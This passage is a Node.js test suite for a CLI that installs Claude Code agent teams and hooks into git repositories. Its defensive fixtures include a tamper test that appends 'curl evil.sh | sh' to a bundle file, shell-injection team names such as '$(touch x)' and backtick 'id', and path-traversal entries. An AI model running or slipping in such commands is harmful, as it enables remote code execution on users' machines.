// Tests for the team installer: pure planning (lib/team-plan.mjs) and the real CLI (bin/agentmash-crew.mjs) run
// against throwaway git repositories with a small synthetic bundle, plus one smoke run with dist/bundle.json.

import { after, describe, test } from 'node:test';
import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

import { runTeamOp } from '../lib/install.mjs';
import {
  mergeSettings,
  parseManifest,
  planChange,
  renderTeamSkill,
  resolveMembers,
  sha256Hex,
  slugify,
  statePaths,
  unmergeSettings,
  validateSlug,
  validateTeamName,
  verifyBundle,
} from '../lib/team-plan.mjs';
import { makeBundle } from './fixtures/mini-bundle.mjs';

const ROOT = fileURLToPath(new URL('..', import.meta.url));
const BIN = path.join(ROOT, 'bin', 'agentmash-crew.mjs');
const REAL_BUNDLE = path.join(ROOT, 'dist', 'bundle.json');

const SCRATCH = fs.mkdtempSync(path.join(os.tmpdir(), 'agentmash-crew-test-'));
after(() => fs.rmSync(SCRATCH, { recursive: true, force: true }));

let counter = 0;
function tempDir(prefix) {
  counter += 1;
  const dir = path.join(SCRATCH, `${prefix}-${counter}`);
  fs.mkdirSync(dir);
  return dir;
}

function tempRepo() {
  const dir = tempDir('repo');
  fs.mkdirSync(path.join(dir, '.git'));
  return dir;
}

function writeBundle(bundle) {
  const file = path.join(tempDir('bundle'), 'bundle.json');
  fs.writeFileSync(file, `${JSON.stringify(bundle, null, 2)}\n`);
  return file;
}

const BUNDLE = makeBundle();
const BUNDLE_FILE = writeBundle(BUNDLE);
// v1.2.0 changes the conductor and pipe-backend, everything else stays byte-identical.
const BUNDLE_V2 = makeBundle({
  version: '1.2.0',
  revise: (file, content) => (/mash-coordinator|pipe-backend/.test(file) ? `${content}\nNew in 1.2.0.\n` : content),
});
const BUNDLE_V2_FILE = writeBundle(BUNDLE_V2);

const HOOK = BUNDLE.meta.hook;
const SHARED = BUNDLE.shared.map((file) => file.path);
const agentPath = (name) => `.claude/agents/${name}.md`;
const agentContent = (bundle, name) => bundle.agents.find((agent) => agent.name === name).content;
const SKILL_K = '.claude/skills/team-komanda-123/SKILL.md';
const MANIFEST = '.claude/agentmash-crew/teams.json';
const SETTINGS = '.claude/settings.json';

/** Runs the real CLI. `bundle: null` uses the CLI's default bundle (dist/bundle.json). */
function cli(args, { bundle = BUNDLE_FILE, cwd, env = {} } = {}) {
  const argv = bundle === null ? args : [...args, '--bundle', bundle];
  const result = spawnSync(process.execPath, [BIN, ...argv], { encoding: 'utf8', cwd, env: { ...process.env, NO_COLOR: '1', ...env } });
  return { code: result.status, stdout: result.stdout, stderr: result.stderr };
}

function ok(result) {
  assert.equal(result.code, 0, `expected exit 0\nstdout:\n${result.stdout}\nstderr:\n${result.stderr}`);
  return result;
}

/** Every file (content) and directory ("dir") below `dir`, .git excluded. */
function snapshot(dir) {
  const tree = {};
  const walk = (rel) => {
    for (const entry of fs.readdirSync(path.join(dir, rel), { withFileTypes: true })) {
      if (rel === '' && entry.name === '.git') continue;
      const child = rel === '' ? entry.name : `${rel}/${entry.name}`;
      const abs = path.join(dir, child);
      if (entry.isSymbolicLink()) tree[child] = `symlink -> ${fs.readlinkSync(abs)}`;
      else if (entry.isDirectory()) {
        tree[`${child}/`] = 'dir';
        walk(child);
      } else tree[child] = fs.readFileSync(abs, 'utf8');
    }
  };
  walk('');
  return tree;
}

const escapeRe = (text) => text.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');

/** The printed commit command, one line. */
const commitLine = (result) => result.stdout.split('\n').find((line) => / commit -m /.test(line)).replace(/^ {2}1\. /, '');

const filesIn = (repo) => Object.keys(snapshot(repo)).filter((key) => !key.endsWith('/')).sort();
const read = (repo, rel) => fs.readFileSync(path.join(repo, rel), 'utf8');
const exists = (repo, rel) => fs.existsSync(path.join(repo, rel));
const manifestOf = (repo) => JSON.parse(read(repo, MANIFEST));

// ---------------------------------------------------------------------------------------------------------------

describe('slugify', () => {
  test('transliterates Russian and lowercases', () => {
    assert.equal(slugify('Команда 123'), 'komanda-123');
    assert.equal(slugify('Щука & Ёж: объект!'), 'shchuka-ezh-obekt');
    assert.equal(slugify('ЦЕХ Чистоты Юг Ямы'), 'tseh-chistoty-yug-yamy');
  });

  test('transliterates Kazakh letters', () => {
    assert.equal(slugify('Әлем Ғарыш Қала Ңң Өмір Ұлы Үй Һ Іні'), 'alem-garysh-qala-nn-omir-uly-ui-h-ini');
  });

  test('collapses punctuation and whitespace runs into single dashes', () => {
    assert.equal(slugify('  --Hello,   World!!--  '), 'hello-world');
    assert.equal(slugify('v2.0 / API_team'), 'v2-0-api-team');
  });

  test('refuses names with nothing usable and asks for --slug', () => {
    for (const name of ['', '!!!', '中文团队', 'ъь']) assert.throws(() => slugify(name), /--slug/);
  });

  test('cuts to 40 characters and never ends with a dash', () => {
    assert.equal(slugify('b'.repeat(50)), 'b'.repeat(40));
    assert.equal(slugify(`${'a'.repeat(39)} bcd`), 'a'.repeat(39));
  });

  test('validateSlug accepts only the slug alphabet', () => {
    assert.equal(validateSlug('k123'), 'k123');
    for (const bad of ['Bad', '-x', 'a b', 'a'.repeat(41), '', 'ко']) assert.throws(() => validateSlug(bad), /invalid slug/);
  });
});

describe('validateTeamName', () => {
  test('trims and keeps the name as typed', () => {
    assert.equal(validateTeamName('  Команда 123  '), 'Команда 123');
  });

  test('rejects quotes, backslashes, newlines and control characters', () => {
    assert.throws(() => validateTeamName('Say "hi"'), /double quotes, backslashes/);
    assert.throws(() => validateTeamName('back\\slash'), /double quotes, backslashes/);
    assert.throws(() => validateTeamName('line\nbreak'), /line breaks/);
    assert.throws(() => validateTeamName('tab\there'), /control characters/);
    assert.throws(() => validateTeamName('para\u2028graph'), /line breaks/);
  });

  test('rejects $, backticks and ! that would expand inside a double-quoted shell command', () => {
    for (const name of ['Team $HOME', 'Payments $(touch x)', 'Ops `id`', 'Backend Squad!', 'Go!Team']) {
      assert.throws(() => validateTeamName(name), /"\$", "`" or "!"/, name);
    }
    assert.equal(validateTeamName("Backend Squad (EU) & Ops: 'core' #2"), "Backend Squad (EU) & Ops: 'core' #2");
  });

  test('enforces 1..60 characters, counted in code points', () => {
    assert.throws(() => validateTeamName('   '), /empty/);
    assert.throws(() => validateTeamName('x'.repeat(61)), /limit is 60/);
    assert.equal(validateTeamName('x'.repeat(60)), 'x'.repeat(60));
    assert.equal(validateTeamName('🙂'.repeat(60)).length, 120);
  });
});

describe('resolveMembers', () => {
  test('accepts short and full names in any case, conductor first, canonical order', () => {
    assert.deepEqual(resolveMembers(BUNDLE, ['pipe']), ['mash-coordinator', 'pipe-backend']);
    assert.deepEqual(resolveMembers(BUNDLE, ['PROBE', 'Pipe-Backend']), ['mash-coordinator', 'pipe-backend', 'probe-qa']);
  });

  test('all selects the whole crew', () => {
    assert.deepEqual(resolveMembers(BUNDLE, ['all']), BUNDLE.agents.map((agent) => agent.name));
  });

  test('dedupes, ignores empty tokens and forces the conductor in', () => {
    assert.deepEqual(resolveMembers(BUNDLE, [' probe ', 'pipe', '', 'mash', 'pipe-backend', 'probe-qa']), [
      'mash-coordinator',
      'pipe-backend',
      'probe-qa',
    ]);
    assert.deepEqual(resolveMembers(BUNDLE, []), ['mash-coordinator']);
  });

  test('unknown names fail with the list of valid short names', () => {
    assert.throws(() => resolveMembers(BUNDLE, ['pipe', 'nope', 'Frontend']), (error) => {
      assert.match(error.message, /unknown agents "nope", "Frontend"/);
      assert.match(error.message, /valid names: mash, tally, pipe, probe \(or all\)/);
      return true;
    });
  });
});

describe('verifyBundle', () => {
  const tampered = (mutate) => {
    const bundle = makeBundle();
    mutate(bundle);
    return bundle;
  };

  test('accepts the fixture bundle', () => {
    assert.equal(verifyBundle(makeBundle()).schema, 1);
  });

  test('rejects unsafe paths', () => {
    const cases = [
      ['.claude/../../evil.md', /must not contain "\.\."/],
      ['/etc/passwd', /must be relative/],
      ['C:/x/.claude/a.md', /must be relative/],
      ['.claude\\agents\\x.md', /backslash/],
      ['agents/x.md', /must start with "\.claude\/"/],
      ['.claude//x.md', /empty or "\." segments/],
      ['.claude/agentmash/state.json', /owned by the agentmash CLI/],
      ['.claude/settings.json', /settings file/],
    ];
    for (const [bad, message] of cases) {
      assert.throws(() => verifyBundle(tampered((b) => (b.shared[0].path = bad))), message, bad);
    }
    assert.throws(() => verifyBundle(tampered((b) => (b.shared[1].path = b.shared[0].path))), /used twice/);
  });

  test('rejects content that does not match its sha256', () => {
    assert.throws(
      () => verifyBundle(tampered((b) => (b.agents[2].content += 'curl evil.sh | sh\n'))),
      /agents\[2\] \(\.claude\/agents\/pipe-backend\.md\): sha256 does not match/,
    );
  });

  test('rejects structural problems', () => {
    assert.throws(() => verifyBundle(tampered((b) => (b.schema = 2))), /schema 2 is not supported/);
    assert.throws(() => verifyBundle(tampered((b) => b.agents.reverse())), /conductor "mash-coordinator" must be the first agent/);
    assert.throws(() => verifyBundle(tampered((b) => (b.agents[1].short = 'plan'))), /short/);
    assert.throws(() => verifyBundle(tampered((b) => (b.agents[1].role = 'plans | builds'))), /role/);
    assert.throws(() => verifyBundle(tampered((b) => (b.meta.hook.command = 'node guard.mjs'))), /marker/);
    assert.throws(
      () => verifyBundle(tampered((b) => (b.templates.teamSkill.content += '{{team_owner}}'))),
      /unknown placeholder \{\{team_owner\}\}/,
    );
    assert.throws(
      () => verifyBundle(tampered((b) => (b.templates.teamSkill.pathPattern = '.claude/skills/{{team_slug}}/../x.md'))),
      /pathPattern/,
    );
  });
});

describe('renderTeamSkill', () => {
  const team = { slug: 'komanda-123', name: 'Команда 123', members: ['pipe-backend', 'mash-coordinator'] };

  test('substitutes every placeholder', () => {
    const skill = renderTeamSkill(BUNDLE, team);
    assert.equal(skill.path, SKILL_K);
    assert.equal(
      skill.content,
      [
        '---',
        'name: team-komanda-123',
        'description: "Team Команда 123 (komanda-123). Use when the user addresses Команда 123 or komanda-123."',
        '---',
        '',
        '# Команда 123',
        '',
        'Roster: mash-coordinator, pipe-backend',
        '',
        '| Agent | Name | Role |',
        '| --- | --- | --- |',
        '| Mash | `mash-coordinator` | Crew coordinator |',
        '| Pipe | `pipe-backend` | Backend engineer |',
        '',
        'Not in this team: tally-planner, probe-qa',
        '',
        'Add an agent: `npx github:IskakovDamir/agentmash-crew team add "Команда 123" --agents <agent>`',
        '',
      ].join('\n'),
    );
  });

  test('is deterministic and independent of member order', () => {
    const a = renderTeamSkill(BUNDLE, team);
    const b = renderTeamSkill(BUNDLE, { ...team, members: ['mash-coordinator', 'pipe-backend'] });
    assert.deepEqual(a, b);
    assert.deepEqual(a, renderTeamSkill(BUNDLE, team));
  });

  test('says none when the whole crew is in the team', () => {
    const skill = renderTeamSkill(BUNDLE, { ...team, members: BUNDLE.agents.map((agent) => agent.name) });
    assert.match(skill.content, /Not in this team: none\n/);
  });

  test('substitutes in one pass, so placeholder-looking names stay literal', () => {
    const skill = renderTeamSkill(BUNDLE, { slug: 'x', name: '{{team_slug}} & {{add_command}}', members: ['pipe-backend'] });
    assert.match(skill.content, /^# \{\{team_slug\}\} & \{\{add_command\}\}$/m);
  });

  test('rejects names that would break the YAML frontmatter', () => {
    assert.throws(() => renderTeamSkill(BUNDLE, { ...team, name: 'Say "hi"' }), /double quotes/);
    assert.throws(() => renderTeamSkill(BUNDLE, { ...team, name: 'a\\b' }), /backslashes/);
  });
});

describe('settings merge', () => {
  const ours = {
    matcher: 'Bash',
    hooks: [{ type: 'command', command: 'node "$CLAUDE_PROJECT_DIR/.claude/agentmash-crew/crew-guard.mjs"', timeout: 5 }],
  };
  const theirs = {
    permissions: { allow: ['Bash(npm test)'] },
    hooks: {
      PreToolUse: [{ matcher: 'Write', hooks: [{ type: 'command', command: 'echo write' }] }],
      PostToolUse: [{ matcher: 'Edit', hooks: [{ type: 'command', command: 'npx prettier --write' }] }],
    },
  };
  const theirsText = `${JSON.stringify(theirs, null, 2)}\n`;

  test('creates the file when it is missing', () => {
    const merged = mergeSettings(null, HOOK);
    assert.deepEqual(merged, { text: `${JSON.stringify({ hooks: { PreToolUse: [ours] } }, null, 2)}\n`, changed: true, created: true });
  });

  test('keeps every other key and hook group', () => {
    const merged = mergeSettings(theirsText, HOOK);
    assert.equal(merged.changed, true);
    assert.equal(merged.created, false);
    assert.deepEqual(JSON.parse(merged.text), {
      ...theirs,
      hooks: { ...theirs.hooks, PreToolUse: [...theirs.hooks.PreToolUse, ours] },
    });
  });

  test('is idempotent', () => {
    const once = mergeSettings(theirsText, HOOK);
    assert.deepEqual(mergeSettings(once.text, HOOK), { text: once.text, changed: false, created: false });
  });

  test('rejects JSONC and non-objects', () => {
    assert.throws(() => mergeSettings('{\n  // comment\n  "model": "opus"\n}\n', HOOK), /not valid JSON.*comments/);
    assert.throws(() => mergeSettings('{"a": 1,}', HOOK), /not valid JSON/);
    for (const text of ['[]', 'null', '"x"', '42']) assert.throws(() => mergeSettings(text, HOOK), /must contain a JSON object/);
    assert.throws(() => mergeSettings('{"hooks": []}', HOOK), /"hooks" must be an object/);
    assert.throws(() => mergeSettings('{"hooks": {"PreToolUse": {}}}', HOOK), /must be an array/);
  });

  test('unmerge restores the original file and leaves other hooks alone', () => {
    const merged = mergeSettings(theirsText, HOOK);
    assert.deepEqual(unmergeSettings(merged.text, HOOK.marker), { text: theirsText, changed: true, keptGroups: 0 });
    assert.deepEqual(unmergeSettings(theirsText, HOOK.marker), { text: theirsText, changed: false, keptGroups: 0 });
    assert.deepEqual(unmergeSettings(null, HOOK.marker), { text: null, changed: false, keptGroups: 0 });
  });

  test('unmerge deletes a file we created only when it ends up empty', () => {
    const created = mergeSettings(null, HOOK).text;
    assert.deepEqual(unmergeSettings(created, HOOK.marker, { deleteIfEmpty: true }), { text: null, changed: true, keptGroups: 0 });
    assert.deepEqual(unmergeSettings(created, HOOK.marker), { text: '{}\n', changed: true, keptGroups: 0 });
    const withModel = JSON.stringify({ model: 'opus', ...JSON.parse(created) });
    assert.deepEqual(unmergeSettings(withModel, HOOK.marker, { deleteIfEmpty: true }), {
      text: '{\n  "model": "opus"\n}\n',
      changed: true,
      keptGroups: 0,
    });
  });

  test('unmerge removes only our entry from a group the user added a hook to', () => {
    const mine = { type: 'command', command: './my-lint.sh' };
    const shared = { hooks: { PreToolUse: [{ ...ours, hooks: [mine, ...ours.hooks] }] } };
    const result = unmergeSettings(JSON.stringify(shared), HOOK.marker, { deleteIfEmpty: true });
    assert.equal(result.changed, true);
    assert.equal(result.keptGroups, 1);
    assert.deepEqual(JSON.parse(result.text), { hooks: { PreToolUse: [{ matcher: 'Bash', hooks: [mine] }] } });

    // A group of ours that gained a key keeps it, key order included, even with no hooks left.
    const tagged = { hooks: { PreToolUse: [{ matcher: 'Bash', description: 'mine', hooks: ours.hooks }] } };
    const kept = unmergeSettings(JSON.stringify(tagged), HOOK.marker, { deleteIfEmpty: true });
    assert.equal(kept.text, `${JSON.stringify({ hooks: { PreToolUse: [{ matcher: 'Bash', description: 'mine', hooks: [] }] } }, null, 2)}\n`);
    assert.equal(kept.keptGroups, 1);

    // A group that mentions the marker outside its hook entries is not ours to edit.
    const quoted = `${JSON.stringify({ hooks: { PreToolUse: [{ matcher: 'Bash', note: HOOK.marker, hooks: [mine] }] } }, null, 2)}\n`;
    assert.deepEqual(unmergeSettings(quoted, HOOK.marker), { text: quoted, changed: false, keptGroups: 0 });
  });
});

describe('planChange', () => {
  const addOp = { type: 'add', name: 'Команда 123', members: ['pipe'] };
  const emptyState = (op) => ({
    manifest: null,
    settingsText: null,
    onDisk: Object.fromEntries(statePaths(BUNDLE, null, op).map((p) => [p, null])),
  });

  test('a fresh add writes shared files, members and the team skill, sorted', () => {
    const plan = planChange(BUNDLE, emptyState(addOp), addOp);
    const expected = [...SHARED, agentPath('mash-coordinator'), agentPath('pipe-backend'), SKILL_K].sort();
    assert.deepEqual(plan.writes.map((w) => w.path), expected);
    assert.deepEqual(Object.keys(plan.manifest.files), expected);
    assert.deepEqual(plan.deletes, []);
    assert.equal(plan.settings.action, 'created');
    assert.equal(plan.manifestAction, 'created');
    assert.equal(plan.manifest.createdSettings, true);
    assert.deepEqual(Object.keys(plan.manifest), ['schema', 'source', 'createdSettings', 'teams', 'files']);
    assert.equal(plan.manifestText, `${JSON.stringify(plan.manifest, null, 2)}\n`);
    assert.deepEqual(planChange(BUNDLE, emptyState(addOp), addOp), plan);
  });

  test('a file we did not write is refused unless forced, and adopted when identical', () => {
    const state = emptyState(addOp);
    state.onDisk[agentPath('pipe-backend')] = sha256Hex('my own agent\n');
    assert.throws(() => planChange(BUNDLE, state, addOp), /did not write:\n {2}\.claude\/agents\/pipe-backend\.md\n.*--force/);
    const forced = planChange(BUNDLE, state, { ...addOp, force: true });
    assert.deepEqual(forced.changes.find((c) => c.path === agentPath('pipe-backend')), { path: agentPath('pipe-backend'), action: 'overwritten' });

    state.onDisk[agentPath('pipe-backend')] = sha256Hex(agentContent(BUNDLE, 'pipe-backend'));
    const adopted = planChange(BUNDLE, state, addOp);
    assert.equal(adopted.changes.find((c) => c.path === agentPath('pipe-backend')).action, 'unchanged');
    assert.equal(adopted.manifest.files[agentPath('pipe-backend')], sha256Hex(agentContent(BUNDLE, 'pipe-backend')));
  });

  test('update and remove need installed teams; snapshots must cover every path', () => {
    assert.throws(() => planChange(BUNDLE, emptyState({ type: 'update' }), { type: 'update' }), /nothing to update/);
    assert.throws(() => planChange(BUNDLE, emptyState({ type: 'remove' }), { type: 'remove', team: 'x' }), /no agentmash teams/);
    assert.throws(() => planChange(BUNDLE, { manifest: null, settingsText: null, onDisk: {} }, addOp), /internal error/);
  });
});

describe('parseManifest', () => {
  const sha = 'a'.repeat(64);
  const text = (files, teams = [{ slug: 'komanda-123', name: 'Команда 123', members: ['mash-coordinator', 'pipe-backend'] }]) =>
    JSON.stringify({ schema: 1, source: {}, createdSettings: false, teams, files });

  test('accepts what the installer writes', () => {
    const files = { [agentPath('pipe-backend')]: sha, [SKILL_K]: sha, '.claude/agents/retired-agent.md': sha };
    assert.deepEqual(parseManifest(text(files), MANIFEST, BUNDLE).files, files);
  });

  test('refuses keys that name a protected or managed file in another letter case', () => {
    const cases = [
      ['.claude/Settings.json', /settings file, in any letter case/],
      ['.claude/AgentMash/state.txt', /agentmash\/ \(owned by the agentmash CLI\), in any letter case/],
      ['.claude/AGENTMASH', /owned by the agentmash CLI/],
      [MANIFEST, /is the manifest itself/],
      ['.claude/agentmash-crew/Teams.json', /is the manifest itself/],
      ['.claude/Agents/pipe-backend.md', /differs only in letter case from "\.claude\/agents\/pipe-backend\.md"/],
      ['.claude/skills/crew-protocol/skill.md', /differs only in letter case from "\.claude\/skills\/crew-protocol\/SKILL\.md"/],
      ['.claude/skills/Team-Komanda-123/SKILL.md', /differs only in letter case from "\.claude\/skills\/team-komanda-123\/SKILL\.md"/],
      ['.claude/agents/пайп.md', /only ASCII letters/],
    ];
    for (const [key, message] of cases) {
      assert.throws(() => parseManifest(text({ [key]: sha }), MANIFEST, BUNDLE), message, key);
    }
    assert.throws(
      () => parseManifest(text({ '.claude/old/a.md': sha, '.claude/OLD/a.md': sha }), MANIFEST, BUNDLE),
      /"\.claude\/OLD\/a\.md" and "\.claude\/old\/a\.md" differ only in letter case/,
    );
  });

  test('refuses team names that would expand in a shell', () => {
    const teams = [{ slug: 'payments', name: 'Payments $(touch x)', members: ['mash-coordinator', 'pipe-backend'] }];
    assert.throws(() => parseManifest(text({}, teams), MANIFEST, BUNDLE), /teams\[0\]: team name must not contain/);
  });
});

// ---------------------------------------------------------------------------------------------------------------

describe('cli', () => {
  test('add, extend, second team, remove members, remove teams', () => {
    const repo = tempRepo();

    let result = ok(cli(['team', 'add', 'Команда 123', '--agents', 'pipe', '--repo', repo]));
    assert.deepEqual(
      filesIn(repo),
      [...SHARED, agentPath('mash-coordinator'), agentPath('pipe-backend'), SKILL_K, SETTINGS, MANIFEST].sort(),
    );
    assert.match(result.stdout, /^team Команда 123 \(komanda-123\): mash-coordinator, pipe-backend$/m);
    // Run from another folder, so every git call names the repository; exactly the written files are staged.
    assert.equal(
      commitLine(result),
      [
        `git -C ${repo} add --`,
        ...[...SHARED, agentPath('mash-coordinator'), agentPath('pipe-backend'), SKILL_K, SETTINGS, MANIFEST].sort(),
        `&& git -C ${repo} commit -m "chore: add agentmash team Команда 123"`,
      ].join(' '),
    );
    assert.match(result.stdout, /start a new Claude Code session at the repository root/);
    assert.doesNotMatch(result.stdout, /open \/agents/);
    assert.match(result.stdout, /then say: Команда 123, <your task> {3}\(or type: \/team-komanda-123 <your task>\)/);
    let manifest = manifestOf(repo);
    assert.deepEqual(manifest.teams, [{ slug: 'komanda-123', name: 'Команда 123', members: ['mash-coordinator', 'pipe-backend'] }]);
    assert.equal(manifest.createdSettings, true);
    assert.deepEqual(Object.keys(manifest.files), Object.keys(manifest.files).sort());
    for (const [file, sha] of Object.entries(manifest.files)) assert.equal(sha256Hex(read(repo, file)), sha, file);

    // Extend by exact name, from a subfolder, with --flag=value syntax.
    fs.mkdirSync(path.join(repo, 'src', 'deep'), { recursive: true });
    result = ok(cli(['team', 'add', 'Команда 123', '--agents=probe', `--repo=${path.join(repo, 'src', 'deep')}`]));
    assert.match(result.stdout, /created\s+\.claude\/agents\/probe-qa\.md/);
    assert.match(result.stdout, /updated\s+\.claude\/skills\/team-komanda-123\/SKILL\.md/);
    assert.match(read(repo, SKILL_K), /\| Probe \| `probe-qa` \| QA engineer \|/);
    // Every file the installer manages is staged, also the unchanged ones an uncommitted earlier run wrote.
    assert.equal(
      commitLine(result),
      [
        `git -C ${repo} add --`,
        ...[...SHARED, ...['mash-coordinator', 'pipe-backend', 'probe-qa'].map(agentPath), SKILL_K, SETTINGS, MANIFEST].sort(),
        `&& git -C ${repo} commit -m "chore: update agentmash team Команда 123"`,
      ].join(' '),
    );

    // Extend by slug: same team, with a note that the names differ.
    result = ok(cli(['team', 'add', 'komanda-123', '--agents', 'tally', '--repo', repo]));
    assert.match(result.stderr, /same slug as team "Команда 123"; extending that team/);
    assert.deepEqual(manifestOf(repo).teams[0].members, ['mash-coordinator', 'tally-planner', 'pipe-backend', 'probe-qa']);

    ok(cli(['team', 'add', 'Ops', '--agents', 'probe', '--repo', repo]));
    assert.deepEqual(manifestOf(repo).teams.map((team) => team.slug), ['komanda-123', 'ops']);

    // tally is only in Команда 123, so its file goes; probe is shared with Ops, so its file stays.
    ok(cli(['team', 'remove', 'Команда 123', '--agents', 'tally', '--repo', repo]));
    assert.equal(exists(repo, agentPath('tally-planner')), false);
    ok(cli(['team', 'remove', 'komanda-123', '--agents', 'probe-qa', '--repo', repo]));
    assert.equal(exists(repo, agentPath('probe-qa')), true);
    assert.deepEqual(manifestOf(repo).teams[0].members, ['mash-coordinator', 'pipe-backend']);

    result = cli(['team', 'remove', 'Ops', '--agents', 'mash', '--repo', repo]);
    assert.equal(result.code, 1);
    assert.match(result.stderr, /conductor and cannot be removed from a team; remove the team instead: team remove "Ops"/);
    result = cli(['team', 'remove', 'Ops', '--agents', 'probe', '--repo', repo]);
    assert.equal(result.code, 1);
    assert.match(result.stderr, /would leave only mash-coordinator/);

    result = ok(cli(['team', 'remove', 'ops', '--repo', repo]));
    assert.match(result.stdout, /^removed team Ops \(ops\)$/m);
    assert.equal(exists(repo, '.claude/skills/team-ops'), false);
    assert.equal(exists(repo, agentPath('probe-qa')), false);

    result = ok(cli(['team', 'remove', 'Команда 123', '--repo', repo]));
    // Deletions go through `git rm --cached --ignore-unmatch`, which also works for files that were never committed.
    assert.equal(
      commitLine(result),
      [
        `git -C ${repo} rm -q --cached --ignore-unmatch --`,
        ...[...SHARED, agentPath('mash-coordinator'), agentPath('pipe-backend'), SKILL_K, SETTINGS, MANIFEST].sort(),
        `&& git -C ${repo} commit -m "chore: remove agentmash team Команда 123"`,
      ].join(' '),
    );
    assert.deepEqual(snapshot(repo), { '.claude/': 'dir', 'src/': 'dir', 'src/deep/': 'dir' });
  });

  test('an existing settings.json keeps its keys and is restored exactly', () => {
    const repo = tempRepo();
    const original = `${JSON.stringify(
      { permissions: { allow: ['Bash(npm test)'] }, hooks: { PreToolUse: [{ matcher: 'Write', hooks: [{ type: 'command', command: 'echo w' }] }] } },
      null,
      2,
    )}\n`;
    fs.mkdirSync(path.join(repo, '.claude'));
    fs.writeFileSync(path.join(repo, SETTINGS), original);

    ok(cli(['team', 'add', 'Команда 123', '--agents', 'pipe', '--repo', repo]));
    const settings = JSON.parse(read(repo, SETTINGS));
    assert.deepEqual(settings.permissions, { allow: ['Bash(npm test)'] });
    assert.equal(settings.hooks.PreToolUse.length, 2);
    assert.equal(settings.hooks.PreToolUse[0].matcher, 'Write');
    assert.equal(manifestOf(repo).createdSettings, false);

    const again = ok(cli(['team', 'add', 'Команда 123', '--agents', 'pipe', '--repo', repo]));
    assert.match(again.stdout, /nothing to change/);
    assert.doesNotMatch(again.stdout, /next:/);
    assert.equal(JSON.parse(read(repo, SETTINGS)).hooks.PreToolUse.length, 2);

    ok(cli(['team', 'remove', 'Команда 123', '--repo', repo]));
    assert.equal(read(repo, SETTINGS), original);
  });

  test('settings.json with comments or a non-object aborts before any write', () => {
    for (const text of ['{\n  // mine\n  "model": "opus"\n}\n', '[]\n']) {
      const repo = tempRepo();
      fs.mkdirSync(path.join(repo, '.claude'));
      fs.writeFileSync(path.join(repo, SETTINGS), text);
      const before = snapshot(repo);
      const result = cli(['team', 'add', 'Команда 123', '--agents', 'pipe', '--repo', repo]);
      assert.equal(result.code, 1);
      assert.match(result.stderr, /\.claude\/settings\.json (is not valid JSON|must contain a JSON object)/);
      assert.deepEqual(snapshot(repo), before);
    }
  });

  test('refuses files it did not write, writes nothing, and --force overwrites', () => {
    const repo = tempRepo();
    fs.mkdirSync(path.join(repo, '.claude', 'agents'), { recursive: true });
    fs.writeFileSync(path.join(repo, agentPath('pipe-backend')), 'my own pipe\n');
    const before = snapshot(repo);

    const refused = cli(['team', 'add', 'Команда 123', '--agents', 'pipe,probe', '--repo', repo]);
    assert.equal(refused.code, 1);
    assert.match(refused.stderr, /did not write:\n {2}\.claude\/agents\/pipe-backend\.md\n/);
    assert.match(refused.stderr, /--force/);
    assert.deepEqual(snapshot(repo), before);

    const forced = ok(cli(['team', 'add', 'Команда 123', '--agents', 'pipe,probe', '--repo', repo, '--force']));
    assert.match(forced.stdout, /overwritten\s+\.claude\/agents\/pipe-backend\.md/);
    assert.equal(read(repo, agentPath('pipe-backend')), agentContent(BUNDLE, 'pipe-backend'));
    assert.equal(manifestOf(repo).files[agentPath('pipe-backend')], sha256Hex(agentContent(BUNDLE, 'pipe-backend')));
  });

  test('adopts an identical file that is already there', () => {
    const repo = tempRepo();
    fs.mkdirSync(path.join(repo, '.claude', 'agents'), { recursive: true });
    fs.writeFileSync(path.join(repo, agentPath('probe-qa')), agentContent(BUNDLE, 'probe-qa'));
    const result = ok(cli(['team', 'add', 'QA', '--agents', 'probe', '--repo', repo]));
    assert.doesNotMatch(result.stdout.split('next:')[0], /probe-qa\.md/);
    assert.match(commitLine(result), / \.claude\/agents\/probe-qa\.md /, 'an adopted file is the installer\'s, so it is staged');
    assert.match(result.stdout, /1 file unchanged/);
    assert.ok(agentPath('probe-qa') in manifestOf(repo).files);
  });

  test('update keeps locally changed files unless --force', () => {
    const repo = tempRepo();
    ok(cli(['team', 'add', 'Команда 123', '--agents', 'pipe', '--repo', repo]));
    const local = `${agentContent(BUNDLE, 'pipe-backend')}\nOur own rule.\n`;
    fs.writeFileSync(path.join(repo, agentPath('pipe-backend')), local);

    let result = ok(cli(['team', 'update', '--repo', repo]));
    assert.match(result.stdout, /kept\s+\.claude\/agents\/pipe-backend\.md/);
    assert.match(result.stdout, /nothing to change/);
    assert.equal(result.stderr, '');

    result = ok(cli(['team', 'update', '--repo', repo], { bundle: BUNDLE_V2_FILE }));
    assert.match(result.stdout, /updated\s+\.claude\/agents\/mash-coordinator\.md/);
    assert.match(result.stdout, /kept\s+\.claude\/agents\/pipe-backend\.md/);
    assert.match(result.stderr, /warning: kept \.claude\/agents\/pipe-backend\.md: it was changed locally.*--force/);
    assert.equal(read(repo, agentPath('pipe-backend')), local);
    assert.equal(read(repo, agentPath('mash-coordinator')), agentContent(BUNDLE_V2, 'mash-coordinator'));
    let manifest = manifestOf(repo);
    assert.equal(manifest.source.version, '1.2.0');
    assert.equal(manifest.files[agentPath('pipe-backend')], sha256Hex(agentContent(BUNDLE, 'pipe-backend')));

    result = ok(cli(['team', 'update', '--repo', repo, '--force'], { bundle: BUNDLE_V2_FILE }));
    assert.match(result.stdout, /overwritten\s+\.claude\/agents\/pipe-backend\.md/);
    assert.equal(read(repo, agentPath('pipe-backend')), agentContent(BUNDLE_V2, 'pipe-backend'));
    manifest = manifestOf(repo);
    assert.equal(manifest.files[agentPath('pipe-backend')], sha256Hex(agentContent(BUNDLE_V2, 'pipe-backend')));

    // An add with an older crew rewrites the installed files to that version, and says so.
    result = ok(cli(['team', 'add', 'Ops', '--agents', 'probe', '--repo', repo]));
    assert.match(result.stderr, /warning: the teams here were installed by agentmash-crew 1\.2\.0; this is 1\.1\.0/);
    assert.match(result.stdout, /updated\s+\.claude\/agents\/pipe-backend\.md/);
    assert.equal(manifestOf(repo).source.version, '1.1.0');
  });

  test('remove leaves locally changed files in place and stops tracking them', () => {
    const repo = tempRepo();
    ok(cli(['team', 'add', 'Команда 123', '--agents', 'pipe,probe', '--repo', repo]));
    fs.appendFileSync(path.join(repo, agentPath('probe-qa')), 'local\n');

    let result = ok(cli(['team', 'remove', 'Команда 123', '--agents', 'probe', '--repo', repo]));
    assert.match(result.stdout, /left\s+\.claude\/agents\/probe-qa\.md/);
